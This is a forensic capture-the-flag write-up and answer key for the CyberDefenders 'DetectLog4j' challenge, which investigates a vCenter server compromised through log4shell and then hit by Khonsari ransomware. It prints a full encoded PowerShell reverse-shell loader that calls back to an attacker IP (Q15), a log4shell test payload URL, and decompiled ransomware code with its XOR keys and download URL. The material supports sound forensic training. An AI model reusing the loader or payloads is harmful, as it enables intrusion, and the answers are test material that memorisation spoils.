# DetectLog4j

## Info

- Category : Digital Forensics 
- SHA1SUM : 6556e7d46e89bf2ea68e05cf101920e2de071a22 
- Published : Jan. 15, 2022 
- Author : CyberDefenders 
- Size : 2.8 GB 
- Tags : Windows Disk ransomware log4shell  

Uncompress the challenge (pass: cyberdefenders.org)

### Scenario

For the last week, log4shell vulnerability has been gaining much attention not for its ability to execute arbitrary commands on the vulnerable system but for the wide range of products that depend on the log4j library. Many of them are not known till now. We created a challenge to test your ability to detect, analyze, mitigate and patch products vulnerable to log4shell.

### Tools

- Arsenal Image Mounter
- RegistryExplorer
- RegRipper
- EventLog Explorer
- dnspy
- CyberChef
- fakenet
- VirusTotal
- IPLookUp

---

## Questions

### 1 - What is the computer hostname?

With **AccessData FTK Imager**, open the disk and go to `ROOT > System32 > config` and export the **SYSTEM** hive. With **Registry Explorer** import the hive and look at `ROOT > ControleSet > Control > ComputerName`.

**Answer : VCW65**

### 2 - What is the Timezone of the compromised machine?

With **Registry Explorer**: `ROOT > SYSTEM > ControlSet > Control > TimeZoneInformation`

`TimeZoneKeyName: Pacific Standard Time` corresponds to UTC-8

**Answer : UTC-8**

### 3 - What is the current build number on the system?
  
With **Registry Explorer** : `ROOT > SOFTWARE > Microsoft > Windows NT > CurrentVersion > CurrentBuild` : 14393

**Answer : 14393**

### 4 - What is the computer IP?

With **Registry Explorer** : `ROOT > SYSTEM > ControlSet > Services > Tcpip > Parameters > Interfaces > <interface> > NameServer`

**Answer : 192.168.112.139**

### 5 - What is the domain computer was assigned to?
  
With **Registry Explorer** : `ROOT > SYSTEM > ControlSet > Services > Tcpip > Parameters > DNSRegisteredAdapters > <adapter> > PrimaryDomainName`  

**Answer : cyberdefenders.org**

### 6 - When was myoussef user created?

With **AccessData FTK Imager** export Security Logs: `ROOT > windows > system32 > winevt > Logs`

In the event viewer : EventId 4720 & search : myoussef

**Answer : 2021-12-28 06:57:23 UTC**

### 7 - What is the user mhasan password hint?

With **AccessData FTK Imager**, open the disk and go to `ROOT > System32 > config` and export the **SAM** hive. With **Registry Explorer** import the hive and look at `ROOT > SAM > > Domains > Account > Users > mhasan`.

We look at the `last write timestamp` of user mhasan. O, compare With other hives With less intuitive names `ROOT > SAM > Domains > Account > Users > 00000404 > UserPasswordHint`: https://www.linkedin.com/in/0xmohamedhasan/

**Answer : https://www.linkedin.com/in/0xmohamedhasan/**

### 8 - What is the version of the VMware product installed on the machine?

With **Registry Explorer** : `ROOT > SOFTWARE > VMware, Inc. > vCenter Server > ProductVersion` : 6.7.0.40322

**Answer : 6.7.0.40322**

### 9 - What is the version of the log4j library used by the installed VMware product?

With **AccessData FTK Imager**, open the disk and go to `ROOT > Program Files > VMware > vCenter Server > VMware Identity Services`: log4j-core-2.11.2.jar

Note: Look for the location where the application stores its **.jar** files

**Answer : 2.11.2**

### 10 - What is the log4j library log level specified in the configuration file?

With **AccessData FTK Imager**, open the disk and go to `ROOT > Program Files > VMware > vCenter Server > VMware Identity Services`: log4j2.xml

Look at the tags containing the value `level`

**Answer : INFO**

### 11 - The attacker exploited log4shell through an HTTP login request. What is the HTTP header used to inject payload?

Google search: "log4j vcenter exploit"

**Answer : X-Forwarded-For**

### 12 - The attacker used the log4shell.huntress.com payload to detect if vcenter instance is vulnerable. What is the first link of the log4huntress payload?

Note: log4shell.huntress.com is a log4j vulnerability tester

We know the vCenter version (6.7), Google search "log4j exploit vcenter" --> "Workaround instrcution..."

Modification of the Security Token Service (STS)

Search STS logs, With With **AccessData FTK Imager**, open disk and go to `ROOT > ProgramData > VMware > vCenter Server > runtime > VMwareSTSService > logs`: audit_events.log

**Answer : log4shell.huntress.com:1389/b1292f3c-a652-4240-8fb4-59c43141f55a**

### 13 - When was the first successful login to vsphere WebClient?

We look in the file **audit_events.log** and we look for a **LoginSuccess**

**Answer : 2021-12-28 20:39:29 UTC**

### 14 - What is the attacker's IP address?

We look in the file **audit_events.log**

**Answer : 192.168.112.128**
	
### 15 - What is the port the attacker used to receive the cobalt strike reverse shell?

With With **AccessData FTK Imager** export Microsoft-Windows-Powershell/Operational & Admin logs: `ROOT > windows > system32 > winevt > Logs`

Event ID: 4104 | Run a remote command

```powershell
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAAAAAAAANVWaW/iSBD9HH6FN0Ia0CQcCeQajTRtsMEeTDDGNgRFK2M3pqF9jN3mmNH89y0fYYdkd1ba1a60LaF2N1Wv3qu+SsPsUmMRsZkSOJi7NHAUk8DnrkqlMia2FXEfuXfvYNANJAbfn96VylYcY29BD+nwvHSWxMR3Oe0QM+x9OB3WxonPiIdrks9wFIQajrbExjGY+ZaH49CyMUf8NbYZ9610dhYmC0pszqYQglsmvp3Nns1FarnxM1f8jf3E4xClgW0x4Do5hJj7xnUCzyMpxca+2Wg0LrgxjiEczmauYIb7/mdYCvaC6DCKAgZEUvXfOGGP7YThMbYcMyIsR2n9BGMCMrkHLiE+SOEkf0n8FzexaIVzl1LJC4OIVc43OPIxvb6qOZSeV4+AMQNhgLuHpPmAxUYs4gwSscSime5KMUdD5DgRjuOLPLCz08hXXAyW9DRHx+lCaPXDP6HTibDF8GQFnfM7nXyMGOyoBaTvB17Msjc5uaMxzEXsKOA4PbIi2BsQ6+icxQIVWdp/sMyjSc7fVJKCmxZhYhBpsGcpflykO/FFzapv+Q4FwtnSOjuFUEpibAe+E2cRYTm/l84/weGwAy8kFKeHZYh3lzkOpxA7CuJgyWodbWVFYdF14KDBEmyJg6NSOUzVxqeOxeFJDbtB2ufox49jhuIX/9oYL3GEfRs7KD+dBMc1yO3Y8l1c+VQ5LzDTfFxw81Gch3quFeaH2qDYKtXqEbSHfRzBKkt+fkKAZXkSJbhUhiVLaHrYjtJfyL3giVHgaUES2bhSwF1wx5ujWirN+QPD8+fn8taKfrXTu+cjNz8K97c4Ys8PDykKb8X4ppVeUr5bOa8LpNsedYMDgiaIY9XgNd14khRHpprEtJlABvpqJZGm5ML4oAvuiDXCz5NJX9a6fRR196slkmJJ6PMHtckju09uDZnXdfAjnYG63kvI4T136s46O7lpBwkiWSwi7vpjX0N9VZeY1BO0gdrhZeR018ZmXT/ovcFQWoHv01CxqaTYnVi1+3JXF/jdZO06S1FBjd2mI+jtxnQ6MzP/sZzGUmexoqVjfp+OebLTpDSOaqx4U2w/mRtxphqUNzeke9vheX1bd01BhHkyEBI6qkObmgHSFu1ry2yHC89oQG5MbeZ7E8nfq4tQcQ6zfv3ekDJujgwc+ZQnrwuiqi6CG8P3/Pr9NLKboURskU+6GxGhwkYXx5Y7hL53Y7S85X5bN26adKFJPg851SDOLM2v7rkIeaCQynySMGOw3tabOpH3wHvX5L906L1ElqJEnFDe33VT2vXML7UnjV6vD/azKeq2TAepCGmj+qjb0pT0++Z+FLaRgNAjIanfoNEe2fod+vcbb9hXxmGgi/6T2W48En64uA7DRW+/GnxVE6WDgtnVPbN7YsMy5fhpErsTYyiPNdQarNGtJDqwHuOtc624E6q6Q621fzzwuu3RTYqXYXRjVzPb3qLJr5yemyhkM+y4/4G0/3FTF7c7Zslmvqe9G1gnOKO9VtpB31ZR1t+Yn8eT9rJuaPJwojeI3IbfHezJqw3YdlIbT34P+1oILbkF+1qTRoIkTZEzePLIzpGQ/Qjnfjo1xdVMQ3oWW1dGgV+/rte/Cm2FtPbDNazZRDgM1sLhseB3DndceZEsl9mrMM+LnFpa08C1dvKWQ6lyvARrA+y7bMW955oXJ07vT99ywHgpby4Xj9FfmOal0SvA10UP2L0ueqolsuQqcz4I6PMvhZgqVDels7JLg4VFH47vwPUHmI0wS+BdLX0vzX9e/9UUK4pXFs24hYfKUf8Fl2Yjj/Q2LdXSPH+bn7kyy97+t6k9qUsap3j5sHEqKweqppXmG1W3p6qKZ+/qbdQ/KiMK5FdpT4sJcHgpEKuld1BASCmfQtrDQwxlEneJv3B3GStJmHJZ+Q0MfgPEWlHOrwsAAA=="));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

CyberChef --> `Frombase64 > Gunzip`

We get a script.ps1. We put the script in an online sandbox. Network details --> `192.168.112.128:1337`

**Answer : 1337**

### 16 - What is the script name published by VMware to mitigate log4shell vulnerability?

VMware documentation 

**Answer : vc_log4j_mitigator.py**

### 17 - In some cases, you may not be able to update the products used in your network. What is the system property needed to set to 'true' to work around the log4shell vulnerability?

VMware or Microsoft documentation

**Answer : log4j.formatMsgNoLookups**

### 18 - What is the log4j version which contains a patch to CVE-2021-44228?

**Answer : 2.15.0**

### 19 - Removing JNDIlookup.class may help in mitigating log4shell. What is the sha256 hash of the JNDILookup.class?

With With **AccessData FTK Imager**, open disk and extract jar `ROOT > Program Files > VMware > vCenter Server > VMware Identity Services`: log4j-core-2.11.2.jar

Rename log4j-core-2.11.2.jar --> log4j-core-2.11.2.zip

Path : `log4j-core-2.11.2.zip\org\apache\logging\log4j\core\lookup`

**Answer : 0F038A1E0AA0AFF76D66D1440C88A2B35A3D023AD8B2E3BAC8E25A3208499F7E**

### 20 - Analyze JNDILookup.class. What is the value stored in the  CONTAINER_JNDI_RESOURCE_PATH_PREFIX variable?

Install jd-gui (decompiler java), decompile the jar.

`org.apache.logging.log4j.core/lookup/JndiLookup.class`

```java
static final String CONTAINER_JNDI_RESOURCE_PATH_PREFIX = "java:comp/env/";
```

**Answer : java:comp/env/**

### 21 - What is the executable used by the attacker to gain persistence?

With With **AccessData FTK Imager**, open disk and extract file `NTUSER.DAT` from `Administrator.WIN-B633EO9K91M`

With **Registry Explorer** : `ROOT > SOFTWARE > Microsoft > Windows > CurrentVersion > RunOnce` 

**Answer : C:\Users\Adiminstrator\Desktop\baaaackdooor.exe**
	  
### 22 - When was the first submission of ransomware to virustotal?

After some research, note the presence of an exe at the root of disk `C:\`, the file **khonsari.exe**. We put it in VT

**Answer : 2021-12-11 22:57:01**

### 23 - The ransomware downloads a text file from an external server. What is the key used to decrypt the URL?

We can reverse the malware With dnspy, go to the entry point. We see the `webClient.DownloadString()` method. In this XOR operations are performed, we can deduce that the variable `string text = URL_cipher` and `string text3 = key`. You can confirm by putting a breakpoint on the **return** of `webClient.DownloadString()`

```
internal static class SCVuZRaW
{
	// Token: 0x06000007 RID: 7 RVA: 0x00002428 File Offset: 0x00000628
	private static void Main()
	{
		List<string> list = new List<string>();
		WebClient webClient = new WebClient();
		string text = "/\u001b\u0015\u0011R~]pi^UTF`CviVUN\u00120\u001f!(\u001c>\u0002\t=\u0016,\u0018\v\u0004>\u0018\u007f\u0006;3";
		string text2 = text;
		string edhcLlqR = text2;
		string text3 = "GoaahQrC";
		string text4 = text3;
		string vnNtUrJn = text4;
		webClient.DownloadString(oymxyeRJ.CajLqoCk(edhcLlqR, vnNtUrJn));
```

URL : http://3.145.115.94/zambos_caldo_de_p.txt

**Answer : GoaahQrC**

### 24 - What is the ISP that owns that IP that serves the text file?

2 possibilities :
- We have the IP so we can do an IP lookup on 3.145.115.94
- Upload the malware in VT or in an online sandbox and see the connections made by the malware

**Answer : Amazon**

### 25 - The ransomware check for extensions to exclude them from the encryption process. What is the second extension the ransomware checks for?

We know the family of malware, 2 options:

- look for documentation on the exe
- reverse the exe then cyberchef `Unescape string > XOR`

```
private static bool LxqQXinF(string YzmfzBzk)
	{
		string text = "\u007f\u001d\0\a\u000f\"\u000e%8";
		string text2 = text;
		string edhcLlqR = text2;
		string vnNtUrJn = "QvhhaQoW";
		if (!YzmfzBzk.EndsWith(oymxyeRJ.CajLqoCk(edhcLlqR, vnNtUrJn)))
		{
			string text3 = "g\u001d/.";
			string edhcLlqR2 = text3;
			string text4 = "ItAGEocK";
			string vnNtUrJn2 = text4;
			if (!YzmfzBzk.EndsWith(oymxyeRJ.CajLqoCk(edhcLlqR2, vnNtUrJn2)))
			{
				string text5 = "\r\a2";
				string edhcLlqR3 = text5;
				string text6 = "diYplLvh";
				string text7 = text6;
				string vnNtUrJn3 = text7;
				if (!YzmfzBzk.EndsWith(oymxyeRJ.CajLqoCk(edhcLlqR3, vnNtUrJn3)))
				{
					return YzmfzBzk.Equals(SCVuZRaW.HtqeFwaI);
				}
			}
		}
		return true;
	}
```

`g\u001d/. + Unescape string > XOR par ItAGEocK = .ini`

**Answer : ini**
